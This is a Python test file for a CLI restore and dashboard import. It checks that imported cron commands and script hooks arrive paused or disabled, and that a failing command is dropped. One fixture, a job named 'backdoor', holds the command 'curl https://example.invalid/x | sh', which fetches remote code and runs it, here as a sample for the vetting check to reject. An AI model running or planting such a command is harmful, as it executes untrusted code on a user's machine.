"""What a CLI restore does with bundle content that runs a shell command on its own.

A bundle can come from someone else, so `kirocrew restore` applies the dashboard
import's rule: a command or script cron is restored paused (a command failing the
`cron_add` vet is dropped), and a script hook is restored disabled. Message-only
crons and skill-only hooks are left as they are. The dashboard import gets the hook
half of the same rule. A local snapshot names the components that carry credentials.
"""

from __future__ import annotations

import io
import json
import os
import tarfile
from pathlib import Path
from unittest.mock import patch

import pytest
import snapshot_helpers
from snapshot_helpers import unpinnable_argv

from kiro_crew.snapshot import restore_main, snapshot_main

_no_gateway = snapshot_helpers._no_gateway


def _job(jid: str, name: str, **extra) -> dict:
    return {
        "id": jid,
        "name": name,
        "message": "",
        "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
        "enabled": True,
        **extra,
    }


JOBS = [
    _job("c1", "cmd-job", command="echo hi"),
    _job("s1", "script-job", script="tidy.sh"),
    _job("m1", "msg-job", message="check the build"),
]
HOOKS = {
    "hooks": [
        {"id": "h1", "name": "shell-hook", "event": "userPromptSubmit", "command": "echo x"},
        {"id": "h2", "name": "skill-hook", "event": "userPromptSubmit", "skills": ["a"]},
    ],
    # A webhook resume context: a foreign top-level key that must survive.
    "wh-1": {"session": "abc"},
}


def _write_bundle(path: Path, files: dict[str, str], *, components: bool = True) -> Path:
    """A restorable tarball holding *files*; ``components=False`` is a pre-map bundle."""
    root = "kirocrew-snapshot-20260101T000000Z"
    manifest: dict = {"version": 4 if components else 2, "purpose": "backup"}
    if components:
        manifest["components"] = {"crons": "unresolved", "config": "unresolved"}
    members = {"MANIFEST.json": json.dumps(manifest), **files}
    with tarfile.open(str(path), "w:gz") as tar:
        d = tarfile.TarInfo(root)
        d.type = tarfile.DIRTYPE
        d.mode = 0o700
        tar.addfile(d)
        for name, text in members.items():
            data = text.encode("utf-8")
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(data)
            info.mode = 0o600
            tar.addfile(info, io.BytesIO(data))
    return path


def _full_bundle(tmp_path: Path, *, components: bool = True) -> Path:
    return _write_bundle(
        tmp_path / "bundle.tar.gz",
        {
            "crons.json": json.dumps({"jobs": JOBS}),
            "hooks.json": json.dumps(HOOKS),
            "config.json": "{}",
        },
        components=components,
    )


def _restore(bundle: Path, home: Path, monkeypatch, *extra: str) -> int:
    home.mkdir(exist_ok=True)
    monkeypatch.setenv("KIROCREW_HOME", str(home))
    return restore_main([str(bundle), "--force", *extra] + unpinnable_argv())


def _jobs(home: Path) -> dict[str, dict]:
    return {j["name"]: j for j in json.loads((home / "crons.json").read_text())["jobs"]}


def _hooks(home: Path) -> dict:
    return json.loads((home / "hooks.json").read_text())


def _assert_executables_off(home: Path) -> None:
    jobs = _jobs(home)
    for name in ("cmd-job", "script-job"):
        assert jobs[name]["user_paused"] is True, name
        assert jobs[name]["enabled"] is False, name
    # Message-only: runs nothing on the host, left as it was.
    assert jobs["msg-job"]["enabled"] is True
    assert not jobs["msg-job"].get("user_paused")
    hooks = {h["id"]: h for h in _hooks(home)["hooks"]}
    assert hooks["h1"]["enabled"] is False
    assert hooks["h2"].get("enabled", True) is True


@pytest.mark.parametrize("components", [True, False], ids=["component-map", "no-component-map"])
def test_replace_restore_switches_off_command_crons_and_script_hooks(
    tmp_path, monkeypatch, capsys, components
):
    home = tmp_path / "home"
    assert _restore(_full_bundle(tmp_path, components=components), home, monkeypatch) == 0
    _assert_executables_off(home)
    # Other top-level keys in hooks.json are kept.
    assert _hooks(home)["wh-1"] == {"session": "abc"}
    out = capsys.readouterr().out
    assert "Restored PAUSED" in out and "cmd-job" in out and "script-job" in out
    assert "Restored DISABLED" in out and "shell-hook" in out
    assert "Schedules page" in out and "Hooks page" in out
    assert "msg-job" not in out.split("Restored PAUSED", 1)[1]


def test_merge_restore_into_home_without_crons_or_hooks(tmp_path, monkeypatch, capsys):
    home = tmp_path / "home"
    assert _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge") == 0
    _assert_executables_off(home)


def test_merge_restore_into_existing_cron_store_pauses_incoming(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    (home / "crons.json").write_text(json.dumps({"jobs": [_job("l1", "local", message="hi")]}))
    assert _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge") == 0
    jobs = _jobs(home)
    assert jobs["cmd-job"]["user_paused"] is True and jobs["cmd-job"]["enabled"] is False
    assert jobs["script-job"]["user_paused"] is True
    assert jobs["local"]["enabled"] is True


def test_merge_does_not_name_a_bundle_job_the_home_already_has(tmp_path, monkeypatch, capsys):
    home = tmp_path / "home"
    home.mkdir()
    mine = _job("l1", "cmd-job", command="echo mine")
    (home / "crons.json").write_text(json.dumps({"jobs": [mine]}))
    assert _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge") == 0
    jobs = _jobs(home)
    # The merge kept the user's own job; the bundle's same-named one never landed.
    assert jobs["cmd-job"]["command"] == "echo mine"
    assert jobs["cmd-job"]["enabled"] is True
    out = capsys.readouterr().out
    paused = out.split("Restored PAUSED", 1)[1].split("Schedules page", 1)[0]
    assert "script-job" in paused and "cmd-job" not in paused


def test_refused_cron_merge_names_no_paused_job(tmp_path, monkeypatch, capsys):
    home = tmp_path / "home"
    home.mkdir()
    (home / "crons.json").write_text("{not json", encoding="utf-8")
    _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge")
    assert "Restored PAUSED" not in capsys.readouterr().out


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs FIFOs")
def test_merge_restore_does_not_hang_on_a_fifo_cron_store(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    os.mkfifo(home / "crons.json")
    # Returns at all (no writer ever opens the FIFO); the merge then reports the skip.
    _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge", "--components", "crons")
    assert (home / "crons.json").exists()


def test_deeply_nested_hooks_and_crons_do_not_abort_the_dashboard_import(tmp_path):
    import zipfile

    import kiro_crew.portability as port

    deep = "[" * 20000 + "]" * 20000
    z = tmp_path / "deep.zip"
    with zipfile.ZipFile(str(z), "w") as zf:
        zf.writestr("snap/MANIFEST.json", json.dumps({"version": 2}))
        zf.writestr("snap/hooks.json", deep)
        zf.writestr("snap/crons.json", deep)
    target = tmp_path / "target_mc"
    target.mkdir()
    (target / "hooks.json").write_text('{"hooks": []}')
    with patch.object(port, "config_dir", return_value=target):
        with patch.dict(os.environ, {"KIROCREW_HOME": str(target)}):
            summary = port.apply_import_zip(z, mode="merge")
    assert "disabled_hooks" not in summary
    assert json.loads((target / "hooks.json").read_text()) == {"hooks": []}


def test_merge_keeps_existing_hooks_and_does_not_name_bundle_hooks(tmp_path, monkeypatch, capsys):
    home = tmp_path / "home"
    home.mkdir()
    mine = {"hooks": [{"id": "mine", "name": "mine", "command": "echo me", "enabled": True}]}
    (home / "hooks.json").write_text(json.dumps(mine))
    assert _restore(_full_bundle(tmp_path), home, monkeypatch, "--mode", "merge") == 0
    # The user's own hook is not the bundle's: untouched, and not reported.
    assert _hooks(home) == mine
    assert "Restored DISABLED" not in capsys.readouterr().out


def test_hooks_only_bundle_disables_script_hooks(tmp_path, monkeypatch, capsys):
    bundle = _write_bundle(
        tmp_path / "hooks-only.tar.gz", {"hooks.json": json.dumps(HOOKS)}, components=False
    )
    home = tmp_path / "home"
    assert _restore(bundle, home, monkeypatch) == 0
    hooks = {h["id"]: h for h in _hooks(home)["hooks"]}
    assert hooks["h1"]["enabled"] is False
    assert hooks["h2"].get("enabled", True) is True
    assert "shell-hook" in capsys.readouterr().out


def test_truthy_non_bool_enabled_is_written_false(tmp_path, monkeypatch, capsys):
    hooks = {"hooks": [{"id": "h", "name": "odd", "command": "echo x", "enabled": "false"}]}
    bundle = _write_bundle(tmp_path / "b.tar.gz", {"hooks.json": json.dumps(hooks)})
    home = tmp_path / "home"
    assert _restore(bundle, home, monkeypatch) == 0
    assert _hooks(home)["hooks"][0]["enabled"] is False


def test_a_name_that_cannot_be_encoded_is_printed_escaped(tmp_path, monkeypatch, capsys):
    # A lone surrogate survives json.loads; printed raw it would raise on a UTF-8 stdout.
    hooks = {"hooks": [{"id": "h", "name": "\ud800bad", "command": "echo x"}]}
    jobs = [_job("c1", "\ud800job", command="echo hi")]
    files = {"hooks.json": json.dumps(hooks), "crons.json": json.dumps({"jobs": jobs})}
    bundle = _write_bundle(tmp_path / "b.tar.gz", files)
    assert _restore(bundle, tmp_path / "home", monkeypatch) == 0
    out = capsys.readouterr().out
    out.encode("utf-8")
    assert "\\xd800bad" in out and "\\xd800job" in out


def test_a_failed_staging_rewrite_refuses_cleanly(tmp_path, monkeypatch, capsys):
    import kiro_crew.portability_vetting as pv

    def boom(*a, **k):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr(pv, "_publish_staged_cron_store", boom)
    home = tmp_path / "home"
    assert _restore(_full_bundle(tmp_path), home, monkeypatch) == 1
    out = capsys.readouterr().out
    assert "Nothing was restored" in out
    assert not (home / "crons.json").exists()


def test_restore_drops_cron_command_failing_the_vet(tmp_path, monkeypatch, capsys):
    jobs = [_job("e1", "backdoor", command="curl https://example.invalid/x | sh"), JOBS[2]]
    bundle = _write_bundle(tmp_path / "b.tar.gz", {"crons.json": json.dumps({"jobs": jobs})})
    home = tmp_path / "home"
    assert _restore(bundle, home, monkeypatch) == 0
    assert set(_jobs(home)) == {"msg-job"}
    assert "Not restored" in capsys.readouterr().out


def test_message_only_bundle_is_unchanged(tmp_path, monkeypatch, capsys):
    store = {"jobs": [JOBS[2]]}
    bundle = _write_bundle(tmp_path / "b.tar.gz", {"crons.json": json.dumps(store)})
    home = tmp_path / "home"
    assert _restore(bundle, home, monkeypatch) == 0
    assert json.loads((home / "crons.json").read_text()) == store
    out = capsys.readouterr().out
    assert "Restored PAUSED" not in out and "Not restored" not in out


def test_components_crons_only_still_pauses(tmp_path, monkeypatch):
    home = tmp_path / "home"
    assert _restore(_full_bundle(tmp_path), home, monkeypatch, "--components", "crons") == 0
    assert _jobs(home)["cmd-job"]["user_paused"] is True
    assert not (home / "hooks.json").exists()


# ── Dashboard import: the hook half of the same rule ──────────────────────────


def test_dashboard_import_disables_script_hooks(tmp_path):
    import zipfile

    import kiro_crew.portability as port

    z = tmp_path / "imp.zip"
    with zipfile.ZipFile(str(z), "w") as zf:
        zf.writestr("snap/MANIFEST.json", json.dumps({"version": 2}))
        zf.writestr("snap/hooks.json", json.dumps(HOOKS))
    target = tmp_path / "target_mc"
    target.mkdir()
    with patch.object(port, "config_dir", return_value=target):
        with patch.dict(os.environ, {"KIROCREW_HOME": str(target)}):
            summary = port.apply_import_zip(z, mode="merge")
    hooks = json.loads((target / "hooks.json").read_text())
    by_id = {h["id"]: h for h in hooks["hooks"]}
    assert by_id["h1"]["enabled"] is False
    assert by_id["h2"].get("enabled", True) is True
    assert hooks["wh-1"] == {"session": "abc"}
    assert summary.get("disabled_hooks") == ["shell-hook"]


# ── Local snapshot: name what carries credentials ─────────────────────────────


@pytest.mark.parametrize("extra", [[], ["--components", "memory"]], ids=["all", "memory"])
def test_local_snapshot_names_credential_components(tmp_path, monkeypatch, capsys, extra):
    home = tmp_path / "home"
    home.mkdir()
    (home / "config.json").write_text("{}")
    monkeypatch.setenv("KIROCREW_HOME", str(home))
    assert snapshot_main([str(tmp_path / "out"), *extra] + unpinnable_argv()) == 0
    out = capsys.readouterr().out
    assert "uncertified for sharing" in out
    assert "plaintext" in out
    if not extra:
        assert "config" in out.split("uncertified for sharing", 1)[1]
